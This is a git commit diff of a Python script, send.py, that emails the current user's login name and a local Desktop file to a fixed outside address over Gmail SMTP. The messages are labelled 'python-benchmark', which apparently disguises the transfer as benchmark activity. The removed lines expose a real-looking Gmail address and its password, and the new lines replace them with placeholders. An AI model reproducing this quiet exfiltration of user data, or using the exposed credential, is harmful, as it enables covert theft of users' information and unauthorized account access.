41cf50b8512e096db6f8d2d153a20d35ca173a98
ahigherbeing <78560204+ahigherbeing@users.noreply.github.com>
2021-02-05 15:15:14 -0500

    Update send.py

--- random-extra-stuff/send.py
+++ random-extra-stuff/send.py
@@ -6,35 +6,29 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 
-fromaddr = "python.benchmark@gmail.com"
-toaddr = "dj.v3n0m.ford@gmail.com"
+#edit this
+fromaddr = "sender@provider.com"
+toaddr = "reciever@provider.com"
 
 msg = MIMEMultipart()
-
 msg['From'] = fromaddr
 msg['To'] = toaddr
 msg['Subject'] = "python-benchmark"
-
 body = getpass.getuser()
-
 msg.attach(MIMEText(body, 'plain'))
-
-
 filename = "rm.txt"
 attachment = open(os.environ["USERPROFILE"] + "\\Desktop\\isolation\\random-extra-stuff\\rm.txt", "rb")
-
-
 part = MIMEBase('application', 'octet-stream')
 part.set_payload((attachment).read())
 encoders.encode_base64(part)
 part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
 msg.attach(part)
-
 server = smtplib.SMTP('smtp.gmail.com', 587)
 server.starttls()
-#pls dont steal my email address
-server.login(fromaddr, "isolated")
+
+#edit this
+server.login(fromaddr, "sender@provider.com password")
+
 text = msg.as_string()
 server.sendmail(fromaddr, toaddr, text)
 server.quit()
